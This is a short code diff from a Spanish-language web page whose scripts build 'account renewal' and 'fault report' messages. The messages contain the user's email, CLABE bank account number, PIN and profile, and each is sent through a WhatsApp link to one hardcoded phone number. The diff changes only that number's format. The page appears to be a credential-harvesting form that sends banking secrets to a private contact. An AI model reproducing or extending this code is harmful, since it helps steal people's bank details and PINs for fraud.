@@ -504,7 +504,7 @@ body {
                 const message = `Solicitud de Renovación de Cuenta:\nCorreo: ${email}\nCLABE: ${clabe}\nPIN: ${pin}\nPerfil: ${profile}\nTipo de Servicio: ${serviceType}\nFecha de Renovación: ${renewalDate}\n\nPor favor, procedan con la renovación.`;
     
                 const apiUrl = 'https://api.whatsapp.com/send';
-                const phoneNumber = '3228610450'; // Número de teléfono destino
+                const phoneNumber = '+563228610450'; // Número de teléfono destino
                 const url = `${apiUrl}?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;
     
                 window.open(url, '_blank');
@@ -527,7 +527,7 @@ body {
                     const message = `Reporte de Fallo en la Aplicación:\nUsuario: ${username}\nCorreo: ${userEmail}\nCLABE: ${clabeInput.value}\nPIN: ${pinInput.value}\nPerfil: ${profileInput.value}\nTipo de Servicio: ${serviceType}\nDescripción del Fallo: ${issueDescription}`;
     
                     const apiUrl = 'https://api.whatsapp.com/send';
-                    const phoneNumber = '3228610450'; // Número de teléfono destino
+                    const phoneNumber = '+563228610450'; // Número de teléfono destino
                     const url = `${apiUrl}?phone=${phoneNumber}&text=${encodeURIComponent(message)}`;
     
                     window.open(url, '_blank');
